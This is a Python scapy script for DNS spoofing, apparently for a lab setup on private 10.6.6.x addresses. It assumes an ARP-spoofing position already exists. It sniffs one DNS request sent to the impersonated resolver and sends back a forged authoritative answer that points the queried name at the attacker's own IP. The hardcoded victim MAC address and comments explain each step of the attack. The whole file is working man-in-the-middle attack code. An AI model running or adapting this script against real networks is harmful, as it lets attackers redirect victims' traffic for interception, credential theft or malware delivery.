#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# shout out to https://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html
# for highly relevant (and accurate) examples

# Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our Mac Addr
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
# destination ip we arp spoofed
ipaddr_we_arp_spoofed = "10.6.6.53"
# target mac: 4c:24:57:ab:ed:84
# target ip: 10.6.6.35

def handle_dns_request(packet):
    # Need to change mac addresses, Ip Addresses, and ports below.
    # We also need
    # packet.show()
    eth = Ether(src=macaddr, dst="4c:24:57:ab:ed:84")   # send to victim mac from actual mac
    ip  = IP(dst=packet[IP].src, src=ipaddr_we_arp_spoofed) # src is what victim expects to see coming back to it
    udp = UDP(dport=packet[UDP].sport, sport=53)        # send packet from dns port, to victims chosen port
    # attach a DNS record which provides what the victim wants with the ipaddr of our attacking host
    dns = DNS(
        id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1, \
        an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=ipaddr))
    dns_response = eth / ip / udp / dns
    dns_response.show()
    sendp(dns_response, iface="eth0")

def main():
    berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                              # dns
        "udp[10] & 0x80 = 0",                           # dns request
        "dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
        "ether dst host {}".format(macaddr)             # our mac address since we spoofed the ip to our mac
    ] )

    # sniff the eth0 int without storing packets in memory and stopping after one dns request
    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)

if __name__ == "__main__":
    main()
